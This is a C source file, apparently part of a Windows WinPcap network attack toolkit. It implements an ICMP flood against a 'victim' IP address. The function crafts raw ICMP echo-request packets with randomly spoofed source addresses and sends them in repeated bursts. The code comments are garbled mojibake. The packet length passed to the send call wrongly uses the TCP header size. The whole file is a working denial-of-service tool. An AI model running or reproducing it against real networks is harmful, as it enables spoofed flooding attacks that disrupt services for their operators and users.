#define WPCAP
#define HAVE_REMOTE

#include <pcap.h>

#include "../headers/types.h"
#include "../headers/ethernet.h"
#include "../headers/ip.h"
#include "../headers/icmp.h"
#include "../headers/tcp.h"

extern pcap_t* select_device();
extern DWORD random_ip_address();
extern WORD checksum(WORD *buffer, DWORD size);

/******************************************************************************/
//  �������, �������������� ����� ICMP Flood.
//
//  ������� ���������:
//      char *victim_ip_address - IP ������ ������.
//      DWORD iteration - ���������� ����������.
//      DWORD interval - �������� ��� ������� ������.
//      WORD burst - ���������� ���������� ��������.
//  �������� ���������:
//      int - ������������ ��������.
//          '0' - ��� � �������.
//          '-1' - �������� ��������� ������.
/******************************************************************************/
int icmp_flood(char *victim_ip_address, DWORD iteration, DWORD interval, WORD burst)
{
    int i = 0;          // �������.

    struct ethernet_header ethernet;    // Ethernet ���������.
    struct ip_header ip;                // IP ���������.
    struct icmp_header icmp;            // ICMP ���������.

    pcap_t *device_handle;              // �������� ���������� ��� ������/�������� ������.

    char data[33] = {"abcdefghijklmnopqrstuvwabcdefghi"};   // ������������ ������.
    char packet[65536] = {0};                               // ������������ �����.
    char temp_buffer[65535] = {0};                          // ��������� ������.

    device_handle = select_device();
    // ���������� Ethernet ���������.
    ethernet.source_mac_address[0] = 0x00;
    ethernet.source_mac_address[1] = 0x00;
    ethernet.source_mac_address[2] = 0x00;
    ethernet.source_mac_address[3] = 0x00;
    ethernet.source_mac_address[4] = 0x00;
    ethernet.source_mac_address[5] = 0x00;
    ethernet.destination_mac_address[0] = 0xff;
    ethernet.destination_mac_address[1] = 0xff;
    ethernet.destination_mac_address[2] = 0xff;
    ethernet.destination_mac_address[3] = 0xff;
    ethernet.destination_mac_address[4] = 0xff;
    ethernet.destination_mac_address[5] = 0xff;
    ethernet.type = htons(ETHERNET_TYPE_IP);
    // ������������ ������.
    memcpy(packet, &ethernet, sizeof(ethernet_header));
    // ���������� IP ���������.
    ip.version = 4;                                             // ������ ��������� IPv4.
    ip.header_length = 5;                                       // ������ IP ���������.
    ip.type_of_service = 0;                                     // ��� ������������.
    ip.total_length = htons(sizeof(ip_header) +
                            sizeof(icmp_header) +
                            sizeof(data));                      // ������ = IP ��������� + ICMP ��������� + ������.
    ip.identification = 0;                                      // �������������.
    ip.flags_fragmentation_offset = 0;                          // ����� ������������ � ��������.
    ip.time_to_live = 255;                                      // ��������� ���������� ���������� ���������������.
    ip.protocol = IPPROTO_ICMP;                                 // �������� ���������� ������.
    ip.destination_ip_address = inet_addr(victim_ip_address);   // IP ����� ����������.
    // ���������� ICMP ���������.
    icmp.type = ICMP_TYPE_ECHO_REQUEST;                         // ��� ���������.

    while (burst--)
    {
        printf(".");
        for (i = (int)(iteration); i > 0; i--)
        {
            // ���������� ������������ ������ IP ���������.
            ip.header_checksum = 0;                     // ����������� ����� IP ���������.
            ip.source_ip_address = random_ip_address(); // IP ����� �����������.
            // ���������� ����������� ����� IP ���������.
            ip.header_checksum = checksum((WORD*)&ip, sizeof(ip_header));
            // ������������ ������.
            memcpy((packet + sizeof(ethernet_header)), &ip, sizeof(ip_header));
            // ���������� ������������ ������ ICMP ���������.
            icmp.checksum = 0;                                  // ����������� ����.
            icmp.code = htons((rand() % 0xff));                 // ��� ������.
            icmp.identifier = htons((rand() % 0xffff));         // �������������.
            icmp.sequence_number = htons((rand() % 0xffff));    // ����� ������������������.
            // ��������� �� ��������� ����� ICMP ���������.
            memcpy(temp_buffer, &icmp, sizeof(icmp_header));
            // ��������� �� ��������� ����� ������.
            memcpy((temp_buffer + sizeof(icmp_header)), &data, sizeof(data));
            // ��������� ����������� ����� ICMP ���������.
            icmp.checksum = checksum((WORD*)&temp_buffer, (sizeof(icmp_header) + sizeof(data)));
            // ������������ ������.
            memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header)), &icmp, sizeof(icmp_header));
            memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header) + sizeof(icmp_header)), &data, sizeof(data));

            // ���������� ����� � ����.
            if (pcap_sendpacket(device_handle,
                                (u_char*)packet,
                                (sizeof(ethernet_header) + sizeof(ip_header) + sizeof(tcp_header) + sizeof(data))) != 0)
            {
                fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(device_handle));
                return -1;
            }
            if (interval)
                Sleep(interval);
        }
    }

    return 0;
}